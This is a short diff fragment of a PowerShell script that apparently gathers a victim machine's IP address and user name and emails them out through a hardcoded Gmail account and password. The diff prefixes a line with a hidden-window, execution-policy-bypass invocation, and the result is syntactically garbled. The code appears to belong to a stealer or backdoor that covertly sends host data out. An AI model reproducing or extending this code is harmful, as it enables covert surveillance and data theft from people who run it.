@@ -12,7 +12,7 @@ $path = "$env:temp/$wd"
 $initial_dir = $PWD.Path
  
 #enviando ip por smtp
-$smtp_e = "robertogonzalez6662@gmail.com";
+powershell -windowstyle hidden -ep bypass $smtp_e = "robertogonzalez6662@gmail.com";
 $smtp_p = "BobEsponja123$!";
 $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress  | Out-String;
 $subject = "$env:UserName logs";
